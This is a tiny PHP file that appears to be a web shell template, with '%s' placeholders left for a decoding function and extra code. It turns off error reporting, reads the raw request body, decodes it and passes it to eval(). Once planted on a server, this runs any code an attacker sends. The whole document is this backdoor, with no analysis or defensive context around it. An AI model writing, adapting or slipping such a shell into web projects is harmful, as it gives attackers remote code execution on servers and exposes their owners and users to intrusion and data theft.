<?php
@error_reporting(0);
%s
$post=%s(file_get_contents("php://input"));
eval($post);
?>